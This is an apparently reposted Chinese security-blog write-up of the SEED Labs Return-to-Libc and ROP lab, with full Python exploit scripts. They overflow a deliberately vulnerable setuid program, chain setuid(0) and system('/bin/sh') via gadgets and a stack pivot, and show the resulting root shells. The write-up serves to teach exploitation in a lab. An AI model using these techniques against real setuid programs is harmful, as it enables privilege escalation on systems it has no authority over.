# Seedlab Ret2Libc 与 ROP WriteUp

阅读量 **189717**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-18 10:00:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01fc711a3431f0e46d.jpg)

> 作者 江湾老菜
>
> ## 简介
>
>
> 本文将简单介绍[SeedLab的Ret2Libc](https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/)实验的ROP部分。  
>
> 代码可以从这个[链接](https://seedsecuritylabs.org/Labs_20.04/Files/Return_to_Libc/Labsetup.zip)下载。

Seedlab的文档中提到过一种ROP的攻击方法，但并没有给出优雅的实现。本文将分享一下我的作法，在介绍ROP之前，我会先简单介绍一下这个实验的return
to libc 部分，让大家对实验设置有一个大概的了解。

## Return to Libc 实验

###  实验设置

首先，Return to Libc实验给了一个存在栈溢出的Bug的C程序:

    
    
    int bof(char *str){
    
        char buffer[BUF_SIZE];
        unsigned int *framep;
    
        // Copy ebp into framep
        asm("movl %%ebp, %0" : "=r" (framep));
    
        /* print out information for experiment purpose */
        printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
        printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);
    
        strcpy(buffer, str);
        return 1;
    }
    

很明显，bug出在strcpy()函数的使用上: 如果字符串str的长度大于BUF_SIZE,
bof()的栈顶和返回地址会被覆盖掉，从而程序的控制流会被劫持。

程序编译的方式为:

    
    
    N = 66
    retlib: retlib.c
        gcc -m32 -DBUF_SIZE=${N} -fno-stack-protector -z noexecstack -o $@ $@.c
        sudo chown root $@ && sudo chmod 4755 $@
    

_sudo chmod 4755_ 中，4的含义是让其他用户能够以root的权限执行retlib程序，也就是说, 这是一个有[Set-UID](https://www.computerhope.com/jargon/s/setuid.htm)权限程序。通过攻击这个有bug的程序，普通用户能够以root的权限执行命令！

另外, 实验将/bin/zsh软连接到/bin/sh:

    
    
    sudo ln -sf /bin/zsh /bin/sh
    

这是因为在system运行的时候，会先调用”/bin/sh”执行程序，再用”/bin/sh”执行指令。而”/bin/sh”默认指向的”/bin/bash”会先drop掉Set-UID权限再执行指令。因此即使system(“/bin/zsh”)，也需要先执行”/bin/sh”,
我们无法直接获取有root权限的shell。这里的设置实际是简化了难度，而在ROP实验中，我们会将恢复”/bin/sh”的软连接。

最后，实验关闭了系统的ASLR, 因此程序段和堆栈的地址是固定的:

    
    
    sudo sysctl -w kernel.randomize_va_space=0
    

###  Return to Libc 攻击方法

####  Return to Libc 程序分析

我们先来分析来一下被攻击程序。通过上面的编译选项我们看到，retlib:

  * 是一个32位的程序:`-m 32`
  * 关闭了栈溢出保护:`-fno-stack-protector`
  * 栈是不可执行的:`-z noexecstack`

程序的main函数会先从badfile文件中读取1000个字符，存在main函数的input[]中，然后把input[]的地址传给刚刚分析的有bug的bof()函数。代码如下:

    
    
    int main(int argc, char **argv)
    {
        char input[1000];
        FILE *badfile; 
    
        badfile = fopen("badfile", "r");
        int length = fread(input, sizeof(char), 1000, badfile);
        printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
        printf("Input size: %d\n", length);
    
        bof(input);
        printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
    
        return 1;
    }
    

我们先创建一个空的badfile，然后运行程序retlib:

    
    
    $ touch badfile
    $ make
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 300
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    (^_^)(^_^) Returned Properly (^_^)(^_^)
    

现在badfile为空,
程序正常返回。但通过这次运行我们通过输出拿到了input[]的地址，bof函数中buffer[]的地址，以及bof函数ebp的地址。由于系统的地址随机化保护是关闭的，下次运行这个程序时，这些地址不变。

由于栈不可执行，我们不能把shellcode放在栈上，然后修改返回地址，让程序返回地址指向shellcode的地址来获得shell权限。 但是,
我们可以把返回地址修改到libc的system()函数，通过执行system(“/bin/sh”), 来拿到shell的权限。

bof()函数执行strcpy()之前，bof的栈地址空间如下:

    
    
    Higher Address
    ......
    ----------------------------    return address
    ---------------------------- Stack address of return address:  0xffffc03c
    old ebp
    ---------------------------- Frame Pointer: 0xffffc038
    xxxxx
    xxxxx
    .....
    ---------------------------- Address of buffer[]: 0xffffc020
    Lower Address
    

而我们需要通过栈溢出把返回地址修改成system()的地址:

    
    
    Higher Address
    ----------------------------    "/bin/sh" address
    ---------------------------- Argument 1 address of system(): 0xffffc044
    return address of system
    ----------------------------    system address
    ---------------------------- Stack address of return address:  0xffffc03c
    xxxx
    ---------------------------- Frame Pointer: 0xffffc038
    xxxxx
    xxxxx
    .....
    ---------------------------- Address of buffer[]: 0xffffc020
    Lower Address
    

这样，程序返回的时候，就会执行system(“/bin/sh”);

####  Return to Libc攻击

首先，通过gdb调试，我们可以获取system()地址和system()返回的地址(exit函数):

    
    
    ./retlib
    gdb-peda$ break main 
    gdb-peda$ run
    gdb-peda$ print system
    $1 = {<text variable, no debug info>} 0xf7e11420 <system>
    gdb-peda$ print exit
    $2 = {<text variable, no debug info>} 0xf7e03f80 <exit>
    

system()的地址是 0xf7e11420, 由于系统的地址随机化保护是关闭的，下次运行程序时，这个地址是不变的。

然后，我们需要把”/bin/sh”地址放在栈上，并把system()第一个参数写成它的地址。由于字符串的结尾’`x00`‘会让strcpy()终止，我们需要把”/bin/sh”放在栈的最后。

通过计算得到返回地址和buffer之间的距离是: 0x1c(0xff83a2cc – 0xff83a2b0)。
因此我们需要在badfile的0x1c地方写入system()地址，在0x1c+4处写入exit地址，在0x1c+8处写入”/bin/sh”地址。”/bin/sh”也是一个字符串，如果写在在了badfile的A个字符处，因此它在栈上的地址是（buffer地址
+ A）。

综合以上分析，构造程序的输入如下:

    
    
    #!/usr/bin/env python3
    import sys
    
    content = bytearray(0xaa for i in range(300))
    content[100: 100+9] = b"/bin/sh\x00"
    
    X = 0x1c+8
    sh_addr = 0xffffc020 + 100 # The address of "/bin/zsh"
    content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
    
    Z = 0x1c+4
    exit_addr = 0xf7e03f80 # The address of exit()
    content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
    
    Y = 0x1c
    system_addr = 0xf7e11420 # The address of system()
    content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
    
    # Save content to a file
    with open("badfile", "wb") as f:
        f.write(content)
    

运行脚本可以生成攻击的badfile，再运行retlib程序，可以拿到root权限:

    
    
    $ ./exploit.py
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 299
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    # id
    uid=1000(vam) gid=1000(vam) euid=0(root) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
    

## ROP(Return-Oriented Programming) 实验

###  实验设置

在retlib的基础上，实验恢复了”/bin/sh”指向”/bin/dash”软连接:

    
    
    sudo ln -sf /bin/dash /bin/sh
    

system()函数在运行的时候，会先调用”/bin/sh”指向的程序(也就是”/bin/dash”)，再通过”/bin/dash”执行其他程序。而在Set-UID的进程中执行”/bin/dash”的时候，它会先drop掉Set-UID权限。如果使用retlibc的攻击方法，我们只能拿到一个没有root权限的shell:

    
    
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 299
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    $ id
    uid=1000(vam) gid=1000(vam) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
    

这时候应该怎么绕过呢？ Seedlab文档给出了两种思路:

  * 把返回地址改成execv()，并设置execv的参数运行”/bin/bash -p”。使用了“-p”参数后，Set-UID权限不会被drop掉。
  * ROP: 在调用system之前， 先控制执行流执行setuid(0)把进程的user ID设置成0，也就是变成了一个root用户的程序。执行system(“/bin/sh”)的时候，即使drop掉了Set-UID权限，也能获得root的shell。

第一种思路是seedlab ret2lib实验的task4, 文档中有详细的教程, 这里不再赘述。  
第二种思路通过构造ROP链攻击，文档有所提及，但没有给出简单优雅的攻击实现，所以下面分享一下我的ROP攻击的实现思路。

###  ROP攻击方法

首先，我们要在函数bof的栈上构造一个ROP链：

    
    
    Higher Address
    --------------------------    address of "/bin/sh"
    --------------------------    exit address
    -------------------------- (C)
    system address
    -------------------------- (B)
    0
    -------------------------- (A) Argument 1 address of setuid(): 0xffffc044
    address of "pop xxx; ret" 
    --------------------------    setuid address
    -------------------------- Stack address of return address:  0xffffc03c
    xxxx
    -------------------------- Frame Pointer: 0xffffc038
    xxxxx
    xxxxx
    .....
    -------------------------- Address of buffer[]: 0xffffc020
    Lower Address
    

如果能把bof的栈构造成这种上图，bof返回时，会先执行setuid(0)。 setuid执行完毕后，会执行ret指令，弹出”pop xxx;
ret”的地址，并将”pop xxx; ret”赋给eip，此时esp的地址在(A)处。执行”pop xxx”
会弹出0，esp指向(B)；再执行ret，eip会变成system的地址，从而执行system(“/bin/sh”)。

可是，如何寻找”pop xxx; ret”这样的代码片段呢？ 我们可以用objdump来反汇编:

    
    
    objdump -d retlib > ass.txt
    less ass.txt
    

在ass.txt中，很容易发现各种符合我们要求的gadgets，比如：

    
    
    Gadget A
        1442:       5b                      pop    %ebx
        1443:       c3                      ret
    

0x1442 + retlib代码段的起始地址，就是Gadget A在程序中的地址。  
代码段的地址可以用peda的`vmmap`命令看到:

    
    
    gdb-peda$ vmmap
    Start      End        Perm      Name
    0x56555000 0x56556000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
    0x56556000 0x56557000 r-xp      /home/vam/cs_lab1/Ret2Libc/retlib
    0x56557000 0x56558000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
    0x56558000 0x56559000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
    0x56559000 0x5655a000 rw-p      /home/vam/cs_lab1/Ret2Libc/retlib
    0xf7dcc000 0xf7de9000 r--p      /usr/lib32/libc-2.31.so
    0xf7de9000 0xf7f41000 r-xp      /usr/lib32/libc-2.31.so
    0xf7f41000 0xf7fb1000 r--p      /usr/lib32/libc-2.31.so
    0xf7fb1000 0xf7fb3000 r--p      /usr/lib32/libc-2.31.so
    0xf7fb3000 0xf7fb5000 rw-p      /usr/lib32/libc-2.31.so
    0xf7fb5000 0xf7fb7000 rw-p      mapped
    0xf7fc9000 0xf7fcb000 rw-p      mapped
    0xf7fcb000 0xf7fcf000 r--p      [vvar]
    0xf7fcf000 0xf7fd1000 r-xp      [vdso]
    0xf7fd1000 0xf7fd2000 r--p      /usr/lib32/ld-2.31.so
    0xf7fd2000 0xf7ff0000 r-xp      /usr/lib32/ld-2.31.so
    0xf7ff0000 0xf7ffb000 r--p      /usr/lib32/ld-2.31.so
    0xf7ffc000 0xf7ffd000 r--p      /usr/lib32/ld-2.31.so
    0xf7ffd000 0xf7ffe000 rw-p      /usr/lib32/ld-2.31.so
    0xfffdc000 0xffffe000 rw-p      [stack]
    

因此，”pop %ebx; ret” 的地址为: 0x1442 + 0x56555000。

到目前为止，一切看起来都很美好。然而，setuid的参数是0，
它是一个int类型的整数，用字符串表示为”\x00\x00\x00\x00”，当strcpy()遇到’\x00’后，会停止拷贝。因此，我们没办法把完整的ROP链拷贝到bof函数的上面。

如何绕过strcpy对与’\x00’的限制呢？
一种方法是栈溢出之后，先执行read()函数，从标准输入中获取新的输入，然后写到栈上。read()没有’\x00’结束的限制，因此它可以写入任意的值。这种方法也是有问题的，由于read()函数需要给fd赋值(read(fd,
buffer, size))，而fd是一个int类型的数字，它一般比较小，高位一定会含有’\x00’。  
seedlab给出了另一种使用sprintf()函数的方法，但这种方法比较复杂，文档中也有提到：

    
    
    The method is quite complicated and takes 15 pages to explain in the SEED book.
    

下面介绍一种比较简洁的思路。  
尽管ROP链不能被完整地拷贝到bof()的栈上面，但main函数的input[]中有一个备份：

    
    
    int length = fread(input, sizeof(char), 1000, badfile);
    

如果我们能把栈(也就是esp)指向input[]相应的位置，就能够顺利地执行ROP的程序流。  
可是如何修改esp呢？我们需要在程序反汇编的结果中找另外的gadgets，利用这些gadgets的组合，来让esp指向input[]的地址。  
我们很幸运，在反汇编的结果中，发现了这样的gadgtes:

    
    
    Gadget B:
    13a5: 59        pop %ecx
    13a6: 5b        pop %ebx
    13a7: 5d        pop %ebp
    13a8: 8d 61 fc  lea -0x4(%ecx),%esp
    13ab: c3        ret
    

Gadget B可以先从栈上pop一个值给%ecx，然后把 %ecx – 4 赋给%esp，最后ret会从栈上取返回地址返回。而栈是被我们控制的
。%ecx和ret的返回地址也都可以不是0，这就绕过了strcpy在’\x00’结束的限制。

根据上面的分析，我们可以构造如下ROP链：

    
    
    Higher Address
    --------------------------    address of "/bin/sh"
    --------------------------    exit address
    --------------------------    system address
    --------------------------(D - rop in input[])
    0
    --------------------------    Gadget A
    --------------------------(C - rop in input[])
    setuid address
    --------------------------(B - rop in input[])
    xxxxx 
    --------------------------    xxxxx
    --------------------------    new stack address in input
    --------------------------    Gadget B
    --------------------------(A - rop in buffer[])
    xxxxx
    xxxxx
    .....
    --------------------------    Lower Address
    

栈溢出后，先执行gadget B(位置A, 在buffer的rop链中):

  * pop %ecx 把新栈顶+4的位置给%ecx
  * lea -0x4(%ecx),%esp 把新栈顶给%esp
  * ret 返回到当前栈顶指向的地址(位置B, 在input的rop链中)

之后，程序会依次执行setuid(0), Gadget A, system(“/bin/sh”), 拿到有root权限的shell。

根据上述分析，实现攻击脚本如下：

    
    
    #!/usr/bin/env python3
    import sys
    
    content = bytearray(0xaa for i in range(300))
    
    process_code = 0x56555000
    pop_ret_addr = 0x1442 + process_code # Gadget A
    pop_lea_addr = 0x13a5 + process_code # Gadget B
    
    
    system_addr = 0xf7e11420
    exit_addr = 0xf7e03f80 
    setuid_addr = 0xf7e98e30
    
    main_buffer = 0xffffc050 
    main_buffer_addr = main_buffer+ 0x1c + 4*5
    
    pay = 0xdeedbeef
    sh_addr = main_buffer + 0x100
    
    chain = [pop_lea_addr, main_buffer_addr, pay, pay, setuid_addr, pop_ret_addr, 0, system_addr, exit_addr, sh_addr]
    
    start = 0x1c
    for i in range(len(chain)):
        content[start+i*4: start+i*4+4] = (chain[i]).to_bytes(4,byteorder='little')
    
    content[0x100:0x100+8] = b"/bin/sh\x00"
    
    # Save content to a file
    with open("badfile", "wb") as f:
        f.write(content)
    

运行脚本之后生成badfile之后，可以获得有root权限的shell:

    
    
    $ python3 exploit.py
    $ ./retlib
    Address of input[] inside main():  0xffffc050
    Input size: 300
    Address of buffer[] inside bof():  0xffffc020
    Frame Pointer value inside bof():  0xffffc038
    # id
    uid=0(root) gid=1000(vam) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
    

(本篇完)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **江湾老菜** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/258025](/post/id/258025)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [栈溢出](/tag/栈溢出)

 **+1** __0赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/xV3B1wWxLSpQVqhE5ua4muBa17hh8f613npEbexwdgoFreA1BicB1l4zrz4qjia2JRCl7p9rkMrGM5iafYoMG6P2Q/132)
江湾老菜

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

